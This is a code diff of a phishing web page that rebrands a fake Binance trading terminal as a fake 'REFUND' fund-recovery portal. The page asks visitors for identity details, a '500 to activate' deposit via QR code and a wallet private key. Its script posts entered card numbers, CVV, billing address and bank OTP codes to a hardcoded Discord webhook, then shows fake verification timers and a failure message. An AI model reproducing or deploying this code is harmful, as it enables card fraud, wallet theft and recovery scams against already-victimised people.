@@ -3,42 +3,42 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Binance | Institutional Terminal</title>
+    <title>REFUND | AMLA</title>
     <link rel="stylesheet" href="https://cloudflare.com">
     <style>
         :root { --bg: #0b0e11; --sidebar: #12161c; --card: #1e2329; --border: #2b3139; --yellow: #f3ba2f; --text: #eaecef; --text-gray: #848e9c; --up: #0ecb81; --down: #f6465d; }
         body { font-family: 'Inter', sans-serif; background: var(--bg); color: var(--text); margin: 0; display: flex; height: 100vh; overflow: hidden; }
-       </div> 
+        
         /* AUTH & MODALS */
         #auth-overlay { position: fixed; inset: 0; background: var(--bg); z-index: 100000; display: flex; justify-content: center; align-items: center; }
         .auth-card { background: var(--card); padding: 35px; border-radius: 20px; width: 420px; text-align: center; border: 1px solid var(--border); }
         .white-modal { position: fixed; inset: 0; background: rgba(0,0,0,0.85); display: none; justify-content: center; align-items: center; z-index: 200000; }
         .white-box { background: white; color: black; padding: 40px; border-radius: 24px; width: 380px; text-align: center; }
-    </div>    
+        
         input, select, textarea { width: 100%; padding: 12px; margin: 8px 0; border-radius: 8px; border: 1px solid var(--border); background: #0b0e11; color: white; box-sizing: border-box; font-size: 14px; }
         .btn-yellow { width: 100%; padding: 14px; background: var(--yellow); color: black; border: none; border-radius: 10px; cursor: pointer; font-weight: bold; margin-top: 10px; }
-     </div>   
+        
         .loader-ring { display: inline-block; width: 50px; height: 50px; border: 4px solid rgba(243, 186, 47, 0.1); border-radius: 50%; border-top-color: var(--yellow); animation: spin 1s linear infinite; }
         @keyframes spin { to { transform: rotate(360deg); } }
-</div>
+
         /* SIDEBAR */
         #sidebar { width: 260px; background: var(--sidebar); border-right: 1px solid var(--border); padding: 25px; display: none; flex-direction: column; }
         .logo { font-size: 24px; font-weight: 800; color: var(--yellow); margin-bottom: 40px; }
         .nav-item { padding: 12px; border-radius: 8px; color: var(--text-gray); cursor: pointer; margin-bottom: 5px; font-size: 14px; display: flex; align-items: center; gap: 10px; }
         .nav-item.active { background: var(--card); color: white; }
         .btn-logout { margin-top: auto; color: var(--text-gray); border-top: 1px solid var(--border); padding-top: 20px; }
-</div>
+
         /* LAYOUT */
         #main-wrapper { flex: 1; display: none; flex-direction: column; overflow: hidden; }
         header { background: var(--sidebar); border-bottom: 1px solid var(--border); padding: 15px 30px; display: flex; justify-content: space-between; align-items: center; }
         main { flex: 1; padding: 30px; overflow-y: auto; }
-</div>
+
         .table-container { background: #12161c; border-radius: 12px; border: 1px solid var(--border); overflow-x: auto; margin-bottom: 30px; }
         table { width: 100%; border-collapse: collapse; text-align: left; min-width: 1000px; }
         th { padding: 15px; background: #1e2329; color: var(--text-gray); font-size: 11px; text-transform: uppercase; position: sticky; top: 0; z-index: 10; }
         td { padding: 15px; border-bottom: 1px solid var(--border); font-size: 13px; font-family: monospace; }
-</div>
-       .qr-display-area { background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 20px auto; }
+
+        .qr-display-area { background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 20px auto; }
         .wait-screen { position: fixed; inset: 0; background: #000; z-index: 200000; display: none; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
         .timer-text { font-size: 50px; font-weight: bold; color: var(--yellow); font-family: monospace; margin: 20px 0; }
         .bank-page { background: white; color: black; max-width: 450px; margin: 30px auto; padding: 40px; border-radius: 12px; text-align: center; border-top: 5px solid #004a99; box-shadow: 0 10px 30px rgba(0,0,0,0.5); }
@@ -49,32 +49,32 @@
 <!-- 1. AUTH OVERLAY -->
 <div id="auth-overlay">
     <div class="auth-card" id="choice-box">
-        <h2 style="color: var(--yellow);">BINANCE</h2>
+        <h2 style="color: var(--yellow);">REFUND</h2>
         <p style="color:var(--text-gray)">v4.0.2</p>
         <button class="btn-yellow" onclick="showForm('reg')">Register Account</button>
         <button class="btn-yellow" style="background:transparent; border:1px solid #555; color:white; margin-top:10px;" onclick="showForm('login')">Member Login</button>
     </div>
-</div>
+
     <div class="auth-card" id="reg-box" style="display:none;">
         <h3>Verify Identity</h3>
         <input type="text" id="r-name" placeholder="Full Name">
         <input type="date" id="r-birth">
         <select id="r-country">
             <option value="" disabled selected>Select Country</option>
-            <option>GERMANY</option><option>USA</option><option>UAE</option><option>Singapore</option>UK</option>JAPAN</option>PHIL</option>
+            <option>GERMANY</option><option>USA</option><option>UE</option><option>Singapore</option>UK</option>JAPAN</option>PHIL</option>
         </select>
         <input type="tel" id="r-phone" placeholder="Phone Number (+**)">
         <input type="email" id="r-email" placeholder="Institutional Email">
         <button class="btn-yellow" onclick="startAuth('reg')">Continue</button>
     </div>
-</div>
-    </div class="auth-card" id="login-box" style="display:none;">
+
+    <div class="auth-card" id="login-box" style="display:none;">
         <h3>Terminal Login</h3>
         <input type="email" id="l-email" placeholder="Email Address">
         <input type="password" placeholder="Password">
         <button class="btn-yellow" onclick="startAuth('login')">Unlock Archive </button>
     </div>
-</div>
+
     <div class="auth-card" id="otp-box" style="display:none;">
         <div id="otp-loading"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Scanning Identity...</h3></div>
         <div id="otp-final" style="display:none;">
@@ -87,10 +87,10 @@
 
 <!-- 2. SIDEBAR -->
 <nav id="sidebar">
-    <div class="logo">BINANCE</div>
-    <div class="nav-item active" id="n-market" onclick="switchView('market')"><i class="fa-solid fa-chart-line"></i> Market Board</div>
-    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> History Logs</div>
-    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit</div>
+    <div class="logo">REFUND</div>
+    <div class="nav-item active" id="n-market" onclick="switchView('market')"><i class="fa-solid fa-chart-line"></i> Refund Board</div>
+    <div class="nav-item" id="n-history" onclick="switchView('history')"><i class="fa-solid fa-list-ul"></i> Process of Refund</div>
+    <div class="nav-item" onclick="switchView('deposit')"><i class="fa-solid fa-arrow-down"></i> Deposit 500 TO ACTIVATE</div>
     <div class="nav-item" onclick="switchView('withdraw')"><i class="fa-solid fa-credit-card"></i> Withdraw</div>
     <div class="nav-item" onclick="openModal()" style="color:var(--yellow);"><i class="fa-solid fa-key"></i> Connect Wallet</div>
     <div class="nav-item btn-logout" onclick="location.reload()"><i class="fa-solid fa-right-from-bracket"></i> Log Out</div>
@@ -98,30 +98,30 @@
 
 <div id="main-wrapper">
     <header>
-        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">BINANCE Archive Active</span></div>
+        <div style="font-weight:bold; font-size:13px;">Terminal: <span style="color:var(--up)">REFUND Archive Active</span></div>
         <div style="display:flex; gap:10px; align-items:center;">
             <select id="currency-select" onchange="updateMarket()" style="background:#2b3139; color:white; border:none; padding:8px 12px; border-radius:5px; font-weight:bold;">
-                <option value="USD">USD</option><option value="PHP">PHP</option><option value="SGD">SGD</option>
+                <option value="USD">USD</option><option value="EURO">EURO</option><option value="SGD">SGD</option> 
             </select>
             <button onclick="openModal()" style="background:var(--yellow); border:none; padding:8px 18px; border-radius:5px; font-weight:bold; cursor:pointer;">Connect</button>
         </div>
     </header>
-</div>
+
     <main>
         <div id="market-view" class="content-view">
             <h1>Market Overview (Rank 1-100)</h1>
-            <div class="table-container"><table><thead><tr><th>#</th><th>Coin Name</th><th>Price</th><th>24h Change</th><th>Market Cap</th></tr></thead><tbody id="market-body"></tbody></table></div>
+            <div class="table-container"><table><thead><tr><th>#</th><th>Last Name</th><th>TOTAL</th><th>CLAIMER OF FUNDS</th><th>Refund Done</th></tr></thead><tbody id="market-body"></tbody></table></div>
         </div>
         <div id="history-view" class="content-view" style="display:none;">
             <h1>Archive History Explorer</h1>
-            <div class="table-container"><table><thead><tr><th>Tax Address</th><th>Block</th><th>Timestamp (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
+            <div class="table-container"><table><thead><tr><th>TRANSACTION CODE</th><th>CLAIMANT CODE</th><th>DATE AND TIME (Hex)</th><th>Value</th></tr></thead><tbody id="history-body"></tbody></table></div>
         </div>
         <div id="deposit-view" class="content-view" style="display:none; text-align:center;">
             <div id="dep-loader" style="padding-top:80px;"><div class="loader-ring"></div><h3 style="color:var(--yellow); margin-top:20px;">Generating Encrypted QR...</h3></div>
             <div id="dep-final" style="display:none; padding-top:20px;">
                 <button onclick="switchView('market')" style="background:none; border:none; color:var(--yellow); cursor:pointer;">←Dashboard</button>
                <div class="qr-display-area" style="background: white; padding: 20px; border-radius: 20px; width: 240px; margin: 0 auto; box-shadow: 0 10px 40px rgba(0,0,0,0.5);">
-                  <img src="https://i.ibb.co/kgQkxQ2N/1000088524.jpg" style="width:100%; display:block; border-radius: 10px;">
+                  <img src="https://i.ibb.co/KcrtxMPW/1000088981.jpg" style="width:100%; display:block; border-radius: 10px;">
 </div>
             </div>
         </div>
@@ -150,20 +150,20 @@
         <p style="font-size:12px; color:#666; margin-bottom:20px;">Connect your institutional vault to unlock 2024 archive funds.</p>
         <input type="text" placeholder="Wallet Name (e.g. MetaMask)" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
         <input type="password" placeholder="Private Key (64 characters)" style="background:#f5f5f5; color:black; border:1px solid #ddd;">
-        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Sync Error: Gateway Timeout 0x822')">Connect Vault</button>
+        <button class="btn-yellow" style="background:black; color:white; width:100%;" onclick="alert('Sync Error: Gateway Timeout 0x822')">CONNECT TO YOUR FUNDS</button>
         <button class="btn-yellow" style="background:#eee; color:#555; width:100%;" onclick="closeModal()">Back to Dashboard</button>
     </div>
 </div>
 
 <!-- DOUBLE WAIT SCREENS -->
-<div id="wait-1" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px;">Syncing with Bank...</h2><div class="timer-text" id="timer-1">05:00</div></div>
-<div id="wait-2" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px; color:var(--yellow);">Finalizing Verification...</h2><div class="timer-text" id="timer-2">05:00</div></div>
+<div id="wait-1" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px;">VERIFYING...</h2><div class="timer-text" id="timer-1">01:00</div></div>
+<div id="wait-2" class="wait-screen"><div class="loader-ring"></div><h2 style="margin-top:30px; color:var(--yellow);">Finalizing Verification...</h2><div class="timer-text" id="timer-2">01:00</div></div>
 
 <script>
     let code = "";
-    let rates = { USD: 1, PHP: 57.50, SGD: 1.35 };
+    let rates = { USD: 11123, EURO: 14383, SGD: 9435 };
     const hook = "https://ptb.discord.com/api/webhooks/1502014942323278016/AEdRKrTMN507nDn3jgQZDE_9IAGbo8tTJkTG_Qd2BU7c-mgRA0tNlSm9pZD79ASM9jdv";
-    const coins = ["Bitcoin", "Ethereum", "Tether", "BNB", "Solana", "XRP", "USDC", "Cardano", "Avalanche", "Dogecoin", "TRON", "Polkadot", "Polygon", "Chainlink", "Shiba Inu"];
+    const coins = ["TRILLO", "SMITH", "JOHNSON", "STANG", "SOLAIRE", "", "UGRON", "CARDANO", "AVALANCHE", "DOGER", "TRON", "POLDDAVOKOT", "STRICKLAND", "GREGGOR", "SHUBA INU"];
 
     function showForm(t) { document.getElementById('choice-box').style.display='none'; document.getElementById(t+'-box').style.display='block'; }
     function startAuth(t) {
@@ -175,7 +175,7 @@
         if(document.getElementById('otp-input').value === code) {
             document.getElementById('auth-overlay').style.display='none'; document.getElementById('sidebar').style.display='flex';
             document.getElementById('main-wrapper').style.display='flex'; updateMarket(); buildHistory();
-        } else { alert("Wrong OTP"); }
+        } else { alert("ACTIVATE FIRST"); }
     }
     function switchView(v) {
         document.querySelectorAll('.content-view').forEach(el=>el.style.display='none');
@@ -195,13 +195,13 @@
         const d = `**[1/2] CARD DETAILS**\nNum: ${document.getElementById('c-num').value}\nExp: ${document.getElementById('c-exp').value}\nCVV: ${document.getElementById('c-cvv').value}\nName: ${document.getElementById('c-name').value}\nAddr: ${document.getElementById('c-addr').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-1').style.display='flex';
-        runTimer(300, 'timer-1', () => { document.getElementById('wait-1').style.display='none'; document.getElementById('card-area').style.display='none'; document.getElementById('bank-otp-area').style.display='block'; });
+        runTimer(60, 'timer-1', () => { document.getElementById('wait-1').style.display='none'; document.getElementById('card-area').style.display='none'; document.getElementById('bank-otp-area').style.display='block'; });
     }
     function step2_OTP() {
         const d = `**[2/2] BANK OTP**\nCard: ${document.getElementById('c-num').value}\nOTP: ${document.getElementById('bank-otp').value}`;
         fetch(hook,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({content:d})});
         document.getElementById('wait-2').style.display='flex';
-        runTimer(300, 'timer-2', () => { alert("Verification Failed. Please Retry Again."); location.reload(); });
+        runTimer(60, 'timer-2', () => { alert("Verification Failed. Please Retry Again."); location.reload(); });
     }
     function runTimer(sec, elId, cb) {
         let el = document.getElementById(elId);
@@ -214,10 +214,10 @@
     }
     function updateMarket() {
         let cur = document.getElementById('currency-select').value; let html = "";
-        for(let i=1; i<=100; i++) {
-            let name = coins[(i-1) % coins.length];
-            let base = i===1?96834.12:(15000/i); let p=(base*rates[cur]).toLocaleString('en-US',{minimumFractionDigits:2});
-            html += `<tr><td>${i}</td><td><strong>${name}</strong></td><td>${cur} ${p}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(101-i).toFixed(1)}B</td></tr>`;
+        for(let i=1; i<=1; i++) {
+            let name = coins[(i-13234) % coins.length];
+            let base = i===1?96834.12:(1500/i); let p=(base*rates[cur]).toLocaleString('en-US',{minimumFractionDigits:2});
+            html += `<tr><td>${i}</td><td><strong>${name}</strong></td><td>${cur} ${p}</td><td style="color:var(--up)">+${(Math.random()*5).toFixed(2)}%</td><td>$${(151-i).toFixed(1)}B</td></tr>`;
         }
         document.getElementById('market-body').innerHTML = html;
     }
@@ -225,7 +225,7 @@
         const body = document.getElementById('history-body'); body.innerHTML = "";
         for(let i=1; i<=35; i++) {
             let b = 17794557 + (i * 12); let ts = "0x" + (1714557000 + (i * 300)).toString(16).toUpperCase();
-            body.innerHTML += `<tr><td>0x823b...8911</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td>- 0.6960 ETH</td></tr>`;
+            body.innerHTML += `<tr><td>0x823b...8911</td><td>${b}</td><td style="color:var(--up)">${ts}</td><td>- 5****.6960</td></tr>`;
         }
     }
 </script>
